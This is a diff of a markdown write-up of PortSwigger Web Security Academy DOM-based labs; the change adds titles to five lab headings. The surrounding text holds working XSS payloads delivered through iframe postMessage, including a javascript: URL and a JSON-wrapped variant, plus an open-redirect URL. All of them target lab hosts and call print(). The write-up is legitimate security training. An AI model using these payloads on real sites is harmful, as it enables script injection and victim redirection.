@@ -4,7 +4,7 @@ Get details at [here](https://portswigger.net/web-security/dom-based)
 
 ---
 
-[Lab 1](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)
+[Lab 1](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages): DOM XSS using web messages
 
 Description of this lab: construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function triggered by web messaging
 
@@ -22,7 +22,7 @@ Using this script for exploit server, to send message including `iframe` to webs
 
 `<iframe src="https://0ace002803d991c3c25ff81400bb00af.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
 
-[Lab 2](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
+[Lab 2](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url): DOM XSS using web messages and a JavaScript URL
 
 Description of this lab: demonstrates a DOM-based redirection vulnerability that is triggered by web messaging
 
@@ -43,7 +43,7 @@ Using this script for exploit server, and solved the lab.
 `<iframe src="https://0a52008a03c68061c212a75100ec00e5.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
 
 
-[Lab 3](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
+[Lab 3](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse): DOM XSS using web messages and json parse
 
 Description of this lab: construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function
 
@@ -81,7 +81,7 @@ Using this script for body exploit server, click to store and deliver to victim 
     <iframe src=https://0a0a00c40438df56c0ea1539003800f9.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
 ```
 
-[Lab 4](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
+[Lab 4](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection): DOM-based open redirection
 
 Description of this lab: exploit this vulnerability and redirect the victim to the exploit server
 
@@ -93,7 +93,7 @@ In this website, there is back button for redirect to home page using function `
 
 Using this URL to exploit: `https://0a52008a03c68061c212a75100ec00e5.web-security-academy.net/post?postId=1&url=https://0a9600e8031e8046c2bda67801c40046.exploit-server.net/`
 
-[Lab 5](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)
+[Lab 5](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation): DOM-based cookie manipulation
 
 Description of this lab: exploit server to direct the victim to the correct pages with injecting a cookie that will cause XSS on a different page and call the print() function
 
